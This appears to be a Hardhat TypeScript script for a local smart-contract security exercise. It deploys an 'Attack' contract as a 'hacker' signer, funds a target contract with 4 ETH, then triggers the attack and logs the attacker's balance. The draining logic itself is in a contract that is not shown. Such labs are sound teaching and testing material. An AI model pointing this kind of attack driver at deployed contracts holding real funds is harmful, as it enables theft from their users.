// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";
import { utils } from "ethers";
import { Attack } from "../typechain/Attack";

const targetAddress = "0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0";

let exploit: Attack;

async function main() {
  const [, hacker] = await ethers.getSigners();
  const Attack = await ethers.getContractFactory("Attack");
  exploit = await Attack.connect(hacker).deploy(targetAddress);
  await exploit.deployed();

  console.log("Attack deployed to:", exploit.address);
}

async function prepareTargetContract() {
  const Target = await ethers.getContractFactory("Contract1");
  const target = await Target.attach(targetAddress);

  const [owner] = await ethers.getSigners();

  target.connect(owner).deposit({ value: utils.parseEther("4.0") });
  console.log("Balance of target contract:", await target.balance());
}

async function attack() {
  const [, hacker] = await ethers.getSigners();
  await exploit.connect(hacker).attack({ value: utils.parseEther("1.0") });
  console.log("Attacker contract balance:", await exploit.balance());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => prepareTargetContract())
  .then(() => attack())
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
